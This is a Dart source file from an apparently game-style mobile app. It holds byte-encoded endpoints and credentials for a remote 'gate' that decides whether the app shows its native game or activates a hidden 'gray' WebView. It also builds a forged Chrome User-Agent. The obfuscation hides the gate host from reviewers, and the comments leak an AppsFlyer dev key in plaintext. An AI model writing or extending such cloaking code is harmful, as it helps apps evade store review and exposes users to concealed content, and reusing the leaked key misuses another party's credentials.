// ============================================================
// LOCKED PARCELS — encoded endpoints & credentials
// ============================================================
// Each `_parcelXxx` is a byte array produced by
// `dart run tool/pack_secrets.dart`, then pasted here. The
// plaintext is never in this file.
//
// While AppsFlyer and Firebase creds are not yet provided by the
// manager, the corresponding parcels stay empty — `unwrap()`
// returns "" for empty input and the gray flow degrades to the
// native game path. Everything compiles and runs; the WebView
// simply cannot activate until real credentials land.
// ============================================================

import '../cipher/peak_cipher.dart';

// Config (gate) endpoint — the POST target that decides gray vs. native.
// Plaintext: https://thunderrpeak.com/config.php
const List<int> _parcelGateEndpoint = <int>[
  153, 183, 186, 108, 13, 126, 128, 187, 238, 237, 154, 1, 200, 110, 60, 41,
  160, 193, 102, 124, 107, 6, 36, 47, 30, 16, 156, 126, 161, 160, 118, 218,
  54, 244, 212,
];

// GCD base for the organic-retry attribution refresh.
// Plaintext: https://gcdsdk.appsflyer.com/install_data/v4.0/
const List<int> _parcelGcdBase = <int>[
  153, 183, 186, 108, 13, 126, 128, 187, 253, 230, 139, 28, 200, 96, 96, 58,
  160, 212, 116, 113, 41, 28, 46, 48, 31, 16, 156, 125, 232, 160, 127, 135,
  50, 253, 200, 223, 32, 127, 74, 190, 150, 40, 84, 118, 226, 57, 155,
];

// Chrome full version fragment used in the forged User-Agent.
// Plaintext: 149.0.7827.163
const List<int> _parcelChromeVersion = <int>[
  192, 247, 247, 50, 78, 106, 152, 172, 168, 178, 193, 94, 154, 56,
];

// WebKit fragment.
// Plaintext: 537.36
const List<int> _parcelWebkitVersion = <int>[
  196, 240, 249, 50, 77, 114,
];

// AppsFlyer Dev Key.
// Plaintext: JZ6JLeVQjxw5aQheAR2RFJ
const List<int> _parcelAttrKey = <int>[
  187, 153, 248, 86, 50, 33, 249, 197, 240, 253, 152, 90, 205, 90, 38, 62,
  145, 246, 53, 69, 3, 47,
];

// Firebase project number.
// Plaintext: 718133543018
const List<int> _parcelMessagingProject = <int>[
  198, 242, 246, 45, 77, 119, 154, 160, 169, 181, 222, 87,
];

String pluckGateEndpoint() => unwrap(_parcelGateEndpoint);
String pluckAttrKey() => unwrap(_parcelAttrKey);
String pluckMessagingProject() => unwrap(_parcelMessagingProject);
String pluckChromeVersion() => unwrap(_parcelChromeVersion);
String pluckWebkitVersion() => unwrap(_parcelWebkitVersion);

/// Builds the GCD attribution-refresh URL. Returns "" when the base is
/// not yet encoded — the caller then treats it as "unavailable" and
/// falls back to the SDK's original conversion payload.
String pluckGcdUrl(String appId, String deviceId) {
  final String base = unwrap(_parcelGcdBase);
  if (base.isEmpty) return '';
  return '$base$appId?devkey=${pluckAttrKey()}&device_id=$deviceId';
}
